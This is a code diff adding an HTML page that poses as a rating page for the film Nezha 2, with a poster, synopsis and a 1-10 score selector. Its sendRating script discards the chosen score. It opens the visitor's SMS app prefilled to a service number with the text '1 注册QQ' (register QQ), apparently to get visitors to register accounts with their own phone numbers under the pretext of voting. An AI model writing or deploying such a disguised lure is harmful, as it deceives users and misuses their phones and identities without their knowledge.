@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>哪吒影后评分</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 50px;
+            text-align: center;
+        }
+        select {
+            padding: 10px;
+            font-size: 16px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        img {
+            max-width: 100%; /* 图片响应式 */
+            height: auto;
+            margin-bottom: 30px; /* 图片与内容间距 */
+        }
+        .description {
+            font-size: 16px;
+            margin-top: 20px;
+            font-weight: normal;
+        }
+    </style>
+</head>
+<body>
+    <h1>哪吒影后评分</h1>
+
+    <!-- 插入哪吒2电影的海报图片 -->
+    <img src="images/p2916323291.webp" alt="哪吒2电影海报">
+
+    <!-- 添加描述文字 -->
+    <div class="description">
+        <p>天劫之后，哪吒、敖丙的灵魂虽保住了，但肉身很快会魂飞魄散。太乙真人打算用七色宝莲给二人重塑肉身。但是在重塑肉身的过程中却遇到重重困难，哪吒、敖丙的命运将走向何方？</p>
+    </div>
+
+    <p>请选择 1 到 10 分</p>
+    <select id="rating">
+        <option value="1">1分</option>
+        <option value="2">2分</option>
+        <option value="3">3分</option>
+        <option value="4">4分</option>
+        <option value="5">5分</option>
+        <option value="6">6分</option>
+        <option value="7">7分</option>
+        <option value="8">8分</option>
+        <option value="9">9分</option>
+        <option value="10">10分</option>
+    </select>
+    <br>
+    <button onclick="sendRating()">确定</button>
+
+    <script>
+        function sendRating() {
+            var rating = document.getElementById('rating').value;
+            var phoneNumber = "106988881700511";  // 目标手机号码
+            var message1 = "1";
+            var message2 = "注册QQ";
+            
+            // 通过 sms: 协议打开手机的短信应用，并预填号码和短信内容
+            var smsLink = `sms:${phoneNumber}?body=${encodeURIComponent(message1 + " " + message2)}`;
+
+            // 跳转到短信应用
+            window.location.href = smsLink;
+        }
+    </script>
+</body>
+</html>
